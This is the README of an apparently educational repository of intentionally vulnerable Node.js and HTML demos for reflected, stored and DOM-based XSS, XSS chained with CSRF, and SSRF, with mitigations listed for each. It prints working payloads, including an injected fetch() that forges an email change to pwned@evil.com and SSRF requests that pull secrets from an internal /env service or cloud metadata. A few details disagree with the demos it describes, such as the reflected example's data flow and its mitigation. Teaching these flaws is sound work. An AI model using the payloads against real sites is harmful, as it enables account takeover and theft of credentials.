# XSS Examples

Hands-on demos of Cross-Site Scripting (XSS) vulnerabilities for educational purposes.

> **Warning:** These examples are intentionally vulnerable. Run them only in a local, isolated environment. Never deploy them publicly.

---

## Examples

### 01 — Reflected XSS

**Location:** `01-reflected/index.html`

A static HTML page with a text input. Whatever you type is reflected live into the DOM via `innerHTML`, with no sanitization.

**How to run:** Open `01-reflected/index.html` directly in a browser (no server needed).

**Attack payload (type in the input field):**
```html
<img src=x onerror="alert('Fatality ☠️')">
```

**Why it works:** The input value is assigned directly to `innerHTML`, so any HTML the user types — including event-handler payloads — is parsed and executed by the browser.

---

### 02 — Stored XSS

**Location:** `02-stored/`

A Node.js/Express chat app backed by SQLite. Messages are saved to the database without sanitization and rendered via `innerHTML` on every page load, so payloads persist and fire for every visitor.

**How to run:**
```bash
cd 02-stored
npm install
npm start
# Open http://localhost:3000
```

**Attack payload (in the message field):**
```html
<img src=x onerror="alert('Fatality ☠️')">
```

> The attribute value must be quoted so the space in the string doesn't break HTML parsing.

**Why it works:** The server stores the raw input in SQLite and the client renders it with `innerHTML`, treating the stored string as live HTML.

---

### 03 — DOM-Based XSS

**Location:** `03-dom-based/index.html`

A static HTML page that acts as a client-side router. It reads a section name from `location.hash` and renders it via `innerHTML`. The payload never reaches the server.

**How to run:** Open `03-dom-based/index.html` directly in a browser (no server needed).

**Attack payload (type in the input field, or craft a URL):**
```html
<img src=x onerror="alert('Fatality ☠️')">
```

Or via URL directly:
```
03-dom-based/index.html#%3Cimg%20src%3Dx%20onerror%3D%22alert('Fatality%20%E2%98%A0%EF%B8%8F')%22%3E
```

**Why it works:** The `#` fragment is never sent to the server. Client-side JS reads `location.hash`, decodes it, and writes it to `innerHTML` — entirely within the browser.

---

### 04 — XSS + CSRF (Account Takeover)

**Location:** `04-xss-csrf/`

A Node.js/Express app showing how XSS can be chained with a CSRF attack. A public comments section is vulnerable to stored XSS. The injected payload silently calls a state-changing endpoint (`POST /api/profile`) to change the victim's email — no CSRF token exists to block it.

**How to run:**
```bash
cd 04-xss-csrf
npm install
npm start
# Open http://localhost:3001
```

**Attack payload (post as a comment):**
```html
<img src=x onerror="fetch('/api/profile',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'pwned@evil.com'})})">
```

**Why it works:** XSS bypasses the Same-Origin Policy, so the injected `fetch()` runs in the victim's browser context with their session/cookies. The `/api/profile` endpoint has no CSRF token, so the forged request is accepted as legitimate.

---

### 05 — XSS + SSRF (Internal Service Exposure)

**Location:** `05-xss-ssrf/`

A Node.js/Express app with a "URL preview" feature: the server fetches any URL the user provides and returns the response body. A second service runs internally on `127.0.0.1:3004` with sensitive data (credentials, API keys) that is never meant to be publicly accessible.

**How to run:**
```bash
cd 05-xss-ssrf
npm install
npm start
# Open http://localhost:3003
```

**Attack payloads:**

① **SSRF** — make the server fetch the internal service's environment dump:
```
http://localhost:3004/env
```
The server fetches its own internal service and returns DB passwords, AWS keys, and other secrets to the attacker.

② **XSS via SSRF** — the fetched response is rendered via `innerHTML`. If the response contains HTML with event handlers, they execute in the victim's browser:
```
data:text/html,<img src=x onerror="alert('XSS via SSRF ☠️')">
```

**Why it works:** The `/api/fetch` endpoint has no allowlist and does not block private IP ranges. The attacker can reach any service the server itself can reach — including `localhost`, `169.254.169.254` (cloud metadata), or internal network hosts. The response is then rendered as HTML, enabling XSS.

---

## Key Differences

| | Reflected | Stored | DOM-Based | XSS + CSRF | XSS + SSRF |
|---|---|---|---|---|---|
| **Payload travels to server** | Yes (query param) | Yes (POST body) | No (`#` fragment never sent) | Yes (stored comment) | Yes (URL to fetch) |
| **Persistence** | No | Yes — database | No | Yes — database | No |
| **Victims** | Crafted URL clicks | Every page visitor | Crafted URL clicks | Every page visitor | Crafted URL clicks |
| **Execution origin** | Server reflects into HTML | Server serves stored payload | Client JS reads hash → DOM | Stored XSS forges API request | Server fetches attacker-controlled content → DOM |
| **Visible in server logs** | Yes | Yes | No | Yes | Yes |
| **Server required** | No | Yes (Node.js) | No | Yes (Node.js) | Yes (Node.js) |

---

## Mitigations

- **Reflected:** Never pass user input through `document.write()`. Use `textContent` or encode output before insertion.
- **Stored:** Sanitize/escape input before storing **and** before rendering. Use `textContent` instead of `innerHTML`, or a library like [DOMPurify](https://github.com/cure53/DOMPurify).
- **DOM-Based:** Avoid writing `location.hash`, `location.search`, or any URL-sourced data to `innerHTML`. Use `textContent`, or sanitize with [DOMPurify](https://github.com/cure53/DOMPurify) before touching the DOM.
- **XSS + CSRF:** Fix the XSS first (sanitize output). Additionally, protect state-changing endpoints with CSRF tokens (e.g. `csurf`) and validate the `Origin`/`Referer` header.
- **XSS + SSRF:** Validate and allowlist URLs before the server fetches them. Block requests to private IP ranges (`127.0.0.0/8`, `169.254.0.0/16`, `10.0.0.0/8`). Never render server-fetched content via `innerHTML`.
